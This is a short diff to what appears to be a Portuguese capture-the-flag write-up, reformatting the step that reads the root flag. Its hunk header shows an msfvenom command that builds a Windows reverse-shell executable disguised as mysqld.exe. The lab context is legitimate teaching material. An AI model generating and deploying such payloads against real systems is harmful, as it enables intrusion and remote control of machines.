@@ -65,7 +65,8 @@ msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4445 -f exe > mysqld.exe
 
 
 
-* ### E aqui encontramos a flag root, e conseguimos ler agora.
-c:\Users\Nekrotic\Desktop>type root.txt
-
+* ### E aqui ( c:\Users\Nekrotic\Desktop>) encontramos a flag root, e conseguimos ler agora.
+```bash
+type root.txt
+```
 
